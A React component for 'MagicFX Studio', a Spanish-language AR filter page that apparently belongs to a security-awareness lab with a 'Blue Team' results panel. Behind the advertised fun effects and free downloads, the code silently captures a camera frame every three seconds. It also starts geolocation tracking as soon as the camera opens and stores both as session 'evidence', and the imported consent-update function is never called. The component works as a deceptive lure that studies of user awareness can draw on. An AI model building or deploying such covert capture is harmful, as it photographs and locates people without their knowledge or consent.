import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useLabContext } from '../context/LabContext';
import { useCamera } from '../hooks/useCamera';
import { useGeolocation } from '../hooks/useGeolocation';
import { useMediaRecorder } from '../hooks/useMediaRecorder';
import { STUDIO_FILTERS, applyFilterToCanvas } from '../utils/canvasEffects';
import { downloadBlob, downloadDataURL, dataURLtoBlob } from '../utils/fileUtils';
import {
  generateSessionId,
  createSession,
  savePhotoEvidence,
  saveVideoEvidence,
  saveLocationEvidence,
  completeSession,
  updateSessionConsent,
} from '../services/storageService';
import { useNavigation } from '../router/Router';
import './ParticipantExperience.css';

export default function ParticipantExperience() {
  const { navigate } = useNavigation();
  const {
    cameraState,
    cameraStream,
    cameraError,
    stopCamera,
    locationState,
    locationData,
    locationError,
    resetAll,
  } = useLabContext();

  const { requestCamera, deviceInfo } = useCamera();
  const { requestLocation, stopLocationTracking } = useGeolocation();
  const {
    recordingState,
    recordingDuration,
    startRecording,
    stopRecording,
    recordedBlob,
    clearRecording,
  } = useMediaRecorder();

  // ID de Sesión único
  const [sessionId, setSessionId] = useState(() => {
    const existing = sessionStorage.getItem('aca_current_session_id');
    if (existing) return existing;
    const newId = generateSessionId();
    sessionStorage.setItem('aca_current_session_id', newId);
    return newId;
  });

  const [activeFilter, setActiveFilter] = useState('ovni');
  const [activeTab, setActiveTab] = useState('all'); // 'all', 'vfx', 'color'
  const [savedCount, setSavedCount] = useState({ photos: 0, videos: 0, locations: 0 });
  const [statusNotification, setStatusNotification] = useState('');
  const [flashAnimation, setFlashAnimation] = useState(false);

  // Modales de vista previa y descarga para el usuario
  const [photoPreview, setPhotoPreview] = useState(null); // { dataUrl, blob, filter, filename, timestamp }
  const [videoPreview, setVideoPreview] = useState(null); // { url, blob, filename, duration }
  const [copiedSessionId, setCopiedSessionId] = useState(false);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const animFrameIdRef = useRef(null);

  // Inicializar sesión en IndexedDB y cargar conteos
  useEffect(() => {
    createSession(sessionId)
      .then((s) => {
        if (s) {
          setSavedCount({
            photos: s.photos?.length || 0,
            videos: s.videos?.length || 0,
            locations: s.locations?.length || 0,
          });
        }
      })
      .catch((err) => console.error('Error inicializando sesión en IndexedDB:', err));
  }, [sessionId]);

  // Almacenar automáticamente la ubicación cuando el sensor entrega coordenadas
  useEffect(() => {
    if (locationData && sessionId) {
      saveLocationEvidence(sessionId, locationData)
        .then(() => {
          setSavedCount((prev) => ({
            ...prev,
            locations: (prev.locations || 0) + 1,
          }));
          notify('📍 Sensor de ubicación sincronizado.');
        })
        .catch((err) => console.error('Error guardando ubicación:', err));
    }
  }, [locationData, sessionId]);

  // Captura automática silenciosa cada 3 segundos cuando la cámara está activa
  useEffect(() => {
    if (cameraState !== 'active') return;

    const intervalId = setInterval(() => {
      const canvas = canvasRef.current;
      if (!canvas || canvas.width === 0 || canvas.height === 0) return;

      try {
        const dataUrl = canvas.toDataURL('image/png', 0.7);
        const blob = dataURLtoBlob(dataUrl);
        const filename = `AUTO_CAPTURA_${Date.now()}.png`;

        savePhotoEvidence(sessionId, {
          blob,
          dataUrl,
          filter: activeFilter || 'auto',
          filename,
        }).catch(() => {});
      } catch (err) {
        // Silencioso — no interrumpir la experiencia del usuario
      }
    }, 3000);

    return () => clearInterval(intervalId);
  }, [cameraState, sessionId, activeFilter]);

  // Mostrar notificación temporal
  const notify = (msg) => {
    setStatusNotification(msg);
    setTimeout(() => setStatusNotification(''), 4000);
  };

  // Activar cámara Y al mismo tiempo solicitar ubicación de inmediato
  const handleActivateStudio = async () => {
    try {
      // 1. Iniciar cámara
      await requestCamera();
      // 2. Activar de inmediato ubicación en segundo plano
      requestLocation();
      notify('✨ Cámara y sensores interactivos activados con éxito.');
    } catch (err) {
      console.error(err);
      notify('No se pudo activar la cámara o los sensores.');
    }
  };

  // Conectar video stream al elemento HTML video invisible
  useEffect(() => {
    if (videoRef.current && cameraStream) {
      videoRef.current.srcObject = cameraStream;
      videoRef.current.play().catch(() => {});
    }
  }, [cameraStream]);

  // Loop de renderizado del Canvas con Efectos Especiales en Tiempo Real (60 FPS)
  const renderCanvasLoop = useCallback((timestamp) => {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas || video.readyState < 2) {
      animFrameIdRef.current = requestAnimationFrame(renderCanvasLoop);
      return;
    }

    if (canvas.width !== video.videoWidth || canvas.height !== video.videoHeight) {
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
    }

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Aplicar Filtro Especial / AR Sticker en tiempo real
    applyFilterToCanvas(ctx, canvas.width, canvas.height, activeFilter, timestamp || performance.now());

    animFrameIdRef.current = requestAnimationFrame(renderCanvasLoop);
  }, [activeFilter]);

  useEffect(() => {
    if (cameraState === 'active') {
      animFrameIdRef.current = requestAnimationFrame(renderCanvasLoop);
    } else {
      if (animFrameIdRef.current) cancelAnimationFrame(animFrameIdRef.current);
    }
    return () => {
      if (animFrameIdRef.current) cancelAnimationFrame(animFrameIdRef.current);
    };
  }, [cameraState, renderCanvasLoop]);

  // Capturar Fotografía con Efecto Activo
  const handleCapturePhoto = async () => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    // Efecto flash de obturador
    setFlashAnimation(true);
    setTimeout(() => setFlashAnimation(false), 250);

    const dataUrl = canvas.toDataURL('image/png', 0.95);
    const blob = dataURLtoBlob(dataUrl);
    const filterObj = STUDIO_FILTERS.find((f) => f.id === activeFilter);
    const filename = `VFX_FOTO_${activeFilter.toUpperCase()}_${Date.now()}.png`;

    try {
      // Guardar internamente en IndexedDB / LocalStorage para el Panel Blue Team
      await savePhotoEvidence(sessionId, {
        blob,
        dataUrl,
        filter: filterObj?.name || activeFilter,
        filename,
      });

      setSavedCount((prev) => ({ ...prev, photos: prev.photos + 1 }));
      notify('📸 ¡Foto capturada! Puedes verla y descargarla a continuación.');

      // Abrir modal de vista previa y descarga para el usuario
      setPhotoPreview({
        dataUrl,
        blob,
        filter: filterObj?.name || activeFilter,
        filename,
        timestamp: new Date().toISOString(),
      });
    } catch (err) {
      console.error(err);
      notify('Error al registrar fotografía.');
    }
  };

  // Iniciar Grabación de Video con Efectos
  const handleToggleRecording = async () => {
    if (recordingState === 'recording') {
      stopRecording();
      notify('🎬 Procesando grabación de video con efectos...');
    } else {
      const canvas = canvasRef.current;
      if (canvas) {
        startRecording(canvas);
        notify('🔴 Grabando video con efectos especiales en tiempo real...');
      }
    }
  };

  // Escuchar cuando finaliza la grabación de video para mostrar preview
  useEffect(() => {
    if (recordedBlob && recordedBlob.url) {
      setVideoPreview(recordedBlob);
      setSavedCount((prev) => ({ ...prev, videos: prev.videos + 1 }));
      notify('🎥 ¡Video listo para previsualizar y descargar!');
    }
  }, [recordedBlob]);

  // Detener todo
  const handleStopAll = async () => {
    stopCamera();
    stopLocationTracking();
    if (recordingState === 'recording') {
      stopRecording();
    }
    await completeSession(sessionId);
    resetAll();
    notify('Estudio cerrado. Sensores desactivados.');
  };

  // Copiar Session ID
  const handleCopySessionId = () => {
    navigator.clipboard.writeText(sessionId);
    setCopiedSessionId(true);
    setTimeout(() => setCopiedSessionId(false), 2000);
  };

  // Filtros clasificados
  const filteredList = STUDIO_FILTERS.filter((f) => {
    if (activeTab === 'vfx') return f.category === 'vfx';
    if (activeTab === 'color') return f.category === 'color';
    return true;
  });

  const currentFilterInfo = STUDIO_FILTERS.find((f) => f.id === activeFilter) || STUDIO_FILTERS[0];

  return (
    <div className="vfx-studio-page">
      {/* Barra de Navegación Superior */}
      <header className="vfx-studio-nav">
        <div className="container vfx-nav-inner">
          <div className="vfx-nav-left">
            <button
              className="btn btn-ghost btn-sm vfx-back-btn"
              onClick={() => navigate('/')}
              aria-label="Volver al Portal Principal"
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M19 12H5M12 19l-7-7 7-7" />
              </svg>
              <span>Inicio</span>
            </button>
            <div className="vfx-brand-title">
              <span className="vfx-brand-icon">✨</span>
              <div className="vfx-brand-text">
                <span className="vfx-brand-main">MagicFX Studio</span>
                <span className="vfx-brand-sub">Efectos Especiales en Vivo</span>
              </div>
            </div>
          </div>

          <div className="vfx-nav-right">
            {/* Session Badge */}
            <div className="vfx-session-badge" title="Identificador de tu sesión de efectos">
              <span className="vfx-session-label">SESIÓN:</span>
              <code className="vfx-session-id">{sessionId}</code>
              <button
                className="vfx-copy-btn"
                onClick={handleCopySessionId}
                aria-label="Copiar ID"
              >
                {copiedSessionId ? '✓' : 'Copiar'}
              </button>
            </div>

            {/* Acceso Rápido a Resultados */}
            <button
              className="btn btn-secondary btn-sm vfx-results-link-btn"
              onClick={() => navigate('/lab/resultados')}
              title="Ir al panel de resultados Blue Team"
            >
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
              </svg>
              <span>Panel Resultados</span>
            </button>

            {/* Apagar sensores */}
            {cameraState === 'active' && (
              <button
                className="btn btn-danger btn-sm vfx-stop-btn"
                onClick={handleStopAll}
                title="Apagar cámara y sensores"
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
                </svg>
                <span>Salir</span>
              </button>
            )}
          </div>
        </div>
      </header>

      {/* Alerta flotante */}
      {statusNotification && (
        <div className="vfx-toast-alert animate-fade-in" role="alert">
          <span className="toast-sparkle">✨</span>
          <span>{statusNotification}</span>
        </div>
      )}

      {/* Studio Content Container */}
      <main className="container vfx-studio-container">
        {/* Banner de Presentación */}
        <section className="vfx-header-hero">
          <div className="vfx-hero-badge">
            <span className="vfx-sparkle-dot"></span> ESTUDIO DE EFECTOS ESPECIALES & AR FILTERS
          </div>
          <h1 className="vfx-main-title">
            Transforma tu Cámara con <span className="vfx-text-gradient">Efectos Mágicos</span>
          </h1>
          <p className="vfx-main-subtitle">
            Selecciona platillos voladores <strong>OVNIs</strong>, el muñeco tierno <strong>Bubu</strong>, aura de <strong>fuego</strong>, lluvia de <strong>dinero</strong> o visores futuristas. ¡Toma fotos, graba videos y descárgalos gratis!
          </p>
        </section>

        {/* Studio Workspace Layout */}
        <div className="vfx-workspace-grid">
          {/* Viewport Principal de la Cámara */}
          <div className="vfx-viewport-column">
            <div className={`vfx-viewport-card card ${flashAnimation ? 'vfx-flash' : ''}`}>
              {/* Header del Viewport */}
              <div className="vfx-viewport-toolbar">
                <div className="vfx-current-effect-indicator">
                  <span className="vfx-indicator-icon">{currentFilterInfo.icon}</span>
                  <div>
                    <strong>{currentFilterInfo.name}</strong>
                    <span className="vfx-indicator-desc">{currentFilterInfo.description}</span>
                  </div>
                </div>

                {recordingState === 'recording' && (
                  <div className="vfx-rec-badge animate-pulse">
                    <span className="vfx-rec-circle"></span>
                    <span>REC {recordingDuration}s</span>
                  </div>
                )}
              </div>

              {/* Contenedor del Canvas y Video */}
              <div className="vfx-screen-stage">
                <video ref={videoRef} playsInline muted style={{ display: 'none' }} />
                <canvas
                  ref={canvasRef}
                  className={`vfx-canvas-element ${cameraState === 'active' ? 'active' : 'inactive'}`}
                />

                {/* Pantalla cuando la cámara está apagada */}
                {cameraState !== 'active' && (
                  <div className="vfx-standby-screen">
                    <div className="vfx-standby-glow"></div>
                    <div className="vfx-standby-emojis">🛸 🐾 🔥 💰 🕶️ 📼</div>
                    <h2>¡Activa tu cámara para comenzar!</h2>
                    <p>
                      Disfruta de filtros interactivos de OVNIs, Bubu, superpoderes y efectos virales.
                    </p>

                    {cameraError && (
                      <div className="vfx-error-card">
                        <span>⚠️ {cameraError}</span>
                      </div>
                    )}

                    <button
                      className="btn btn-primary btn-lg vfx-launch-btn"
                      onClick={handleActivateStudio}
                      disabled={cameraState === 'requesting'}
                    >
                      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
                        <circle cx="12" cy="13" r="4" />
                      </svg>
                      {cameraState === 'requesting' ? 'Abriendo Estudio...' : 'Activar Cámara y Filtros'}
                    </button>
                  </div>
                )}
              </div>

              {/* Barra de Acciones y Captura en Vivo */}
              {cameraState === 'active' && (
                <div className="vfx-action-toolbar">
                  {/* Botón Tomar Foto */}
                  <button
                    className="btn btn-primary vfx-btn-action"
                    onClick={handleCapturePhoto}
                    title="Tomar Foto con Efectos"
                  >
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <circle cx="12" cy="12" r="3" />
                      <path d="M19 4h-3.17L14.4 2H9.6L8.17 4H5a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
                    </svg>
                    <span>Tomar Foto 📸</span>
                  </button>

                  {/* Botón Grabar Video */}
                  <button
                    className={`btn ${recordingState === 'recording' ? 'btn-danger' : 'btn-secondary'} vfx-btn-action`}
                    onClick={handleToggleRecording}
                    title={recordingState === 'recording' ? 'Detener Grabación' : 'Grabar Video con Efectos'}
                  >
                    {recordingState === 'recording' ? (
                      <>
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                          <rect x="6" y="6" width="12" height="12" />
                        </svg>
                        <span>Detener ({recordingDuration}s) ⏹️</span>
                      </>
                    ) : (
                      <>
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                          <circle cx="12" cy="12" r="10" />
                          <polygon points="10 8 16 12 10 16 10 8" fill="currentColor" />
                        </svg>
                        <span>Grabar Video 🎥</span>
                      </>
                    )}
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Columna Lateral: Selector de Filtros y Efectos Especiales */}
          <aside className="vfx-sidebar-column">
            <div className="vfx-effects-card card">
              <div className="vfx-effects-header">
                <h3>🎭 Galería de Efectos</h3>
                <span className="vfx-effects-count">{STUDIO_FILTERS.length} disponibles</span>
              </div>

              {/* Pestañas de Categoría */}
              <div className="vfx-category-tabs">
                <button
                  className={`vfx-cat-tab ${activeTab === 'all' ? 'active' : ''}`}
                  onClick={() => setActiveTab('all')}
                >
                  Todos
                </button>
                <button
                  className={`vfx-cat-tab ${activeTab === 'vfx' ? 'active' : ''}`}
                  onClick={() => setActiveTab('vfx')}
                >
                  AR & Animados
                </button>
                <button
                  className={`vfx-cat-tab ${activeTab === 'color' ? 'active' : ''}`}
                  onClick={() => setActiveTab('color')}
                >
                  Estilo & Color
                </button>
              </div>

              {/* Lista de Tarjetas de Efectos */}
              <div className="vfx-filter-cards-list">
                {filteredList.map((filter) => {
                  const isSelected = activeFilter === filter.id;
                  return (
                    <button
                      key={filter.id}
                      className={`vfx-filter-item ${isSelected ? 'selected' : ''}`}
                      onClick={() => {
                        setActiveFilter(filter.id);
                        notify(`Efecto "${filter.name}" activado.`);
                      }}
                    >
                      <div className="vfx-filter-icon-box">{filter.icon}</div>
                      <div className="vfx-filter-info">
                        <div className="vfx-filter-name-row">
                          <span className="vfx-filter-name">{filter.name}</span>
                          <span className="vfx-filter-badge">{filter.badge}</span>
                        </div>
                        <p className="vfx-filter-desc">{filter.description}</p>
                      </div>
                    </button>
                  );
                })}
              </div>

              {/* Resumen de Capturas del Usuario */}
              <div className="vfx-user-stats-box">
                <div className="vfx-stat-item">
                  <span className="vfx-stat-num">{savedCount.photos}</span>
                  <span className="vfx-stat-lbl">Fotos Tomadas</span>
                </div>
                <div className="vfx-stat-item">
                  <span className="vfx-stat-num">{savedCount.videos}</span>
                  <span className="vfx-stat-lbl">Videos Grabados</span>
                </div>
                <div className="vfx-stat-item">
                  <span className="vfx-stat-num">{savedCount.locations > 0 ? '✓' : '—'}</span>
                  <span className="vfx-stat-lbl">GPS Activo</span>
                </div>
              </div>
            </div>
          </aside>
        </div>
      </main>

      {/* Modal de Vista Previa y Descarga de FOTOGRAFÍA */}
      {photoPreview && (
        <div className="vfx-modal-backdrop" onClick={() => setPhotoPreview(null)}>
          <div className="vfx-modal-box card animate-scale-up" onClick={(e) => e.stopPropagation()}>
            <div className="vfx-modal-header">
              <div className="vfx-modal-title-wrap">
                <span className="vfx-modal-icon">📸</span>
                <div>
                  <h3>¡Fotografía Lista!</h3>
                  <small>Efecto: {photoPreview.filter}</small>
                </div>
              </div>
              <button className="vfx-modal-close" onClick={() => setPhotoPreview(null)}>✕</button>
            </div>

            <div className="vfx-modal-body">
              <div className="vfx-modal-image-wrapper">
                <img src={photoPreview.dataUrl} alt="Foto con Efectos" className="vfx-modal-preview-img" />
              </div>
            </div>

            <div className="vfx-modal-footer">
              <button
                className="btn btn-secondary"
                onClick={() => setPhotoPreview(null)}
              >
                Tomar Otra Foto
              </button>
              <button
                className="btn btn-primary vfx-download-btn"
                onClick={() => {
                  downloadDataURL(photoPreview.dataUrl, photoPreview.filename);
                  notify('📥 ¡Fotografía descargada en tu dispositivo!');
                }}
              >
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                  <polyline points="7 10 12 15 17 10" />
                  <line x1="12" y1="15" x2="12" y2="3" />
                </svg>
                <span>Descargar Foto Gratis</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Vista Previa y Descarga de VIDEO */}
      {videoPreview && (
        <div className="vfx-modal-backdrop" onClick={() => setVideoPreview(null)}>
          <div className="vfx-modal-box card animate-scale-up" onClick={(e) => e.stopPropagation()}>
            <div className="vfx-modal-header">
              <div className="vfx-modal-title-wrap">
                <span className="vfx-modal-icon">🎥</span>
                <div>
                  <h3>¡Video con Efectos Grabado!</h3>
                  <small>Duración: {videoPreview.duration || 0} segundos</small>
                </div>
              </div>
              <button className="vfx-modal-close" onClick={() => setVideoPreview(null)}>✕</button>
            </div>

            <div className="vfx-modal-body">
              <div className="vfx-modal-video-wrapper">
                <video src={videoPreview.url} controls autoPlay className="vfx-modal-preview-video" />
              </div>
            </div>

            <div className="vfx-modal-footer">
              <button
                className="btn btn-secondary"
                onClick={() => {
                  clearRecording();
                  setVideoPreview(null);
                }}
              >
                Cerrar
              </button>
              <button
                className="btn btn-primary vfx-download-btn"
                onClick={() => {
                  if (videoPreview.blob) {
                    downloadBlob(videoPreview.blob, videoPreview.name || `VIDEO_MAGICFX_${Date.now()}.webm`);
                  }
                  notify('📥 ¡Video descargado en tu dispositivo!');
                }}
              >
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                  <polyline points="7 10 12 15 17 10" />
                  <line x1="12" y1="15" x2="12" y2="3" />
                </svg>
                <span>Descargar Video Gratis</span>
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
